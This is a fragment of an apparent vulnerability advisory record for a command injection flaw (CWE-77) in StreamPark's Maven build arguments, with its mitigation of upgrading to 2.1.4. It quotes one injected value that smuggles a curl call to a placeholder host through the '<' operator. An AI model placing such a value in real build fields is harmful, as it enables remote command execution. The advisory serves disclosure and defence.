    "vulnerability": [
        "CWE-77 Improper Neutralization of Special Elements used in a Command ('Command Injection')"
    ],
    "description": "In streampark, the project module integrates Maven's compilation capabilities. The input parameter validation is not strict, allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.Background:In the \"Project\" module, the maven build args\u00a0\u00a0\u201c<\u201d operator causes command injection. e.g : \u201c< (curl\u00a0 http://xxx.com )\u201d will be executed as a command injection,Mitigation:all users should upgrade to 2.1.4,\u00a0 The \"<\" operator will blocked\u3002",
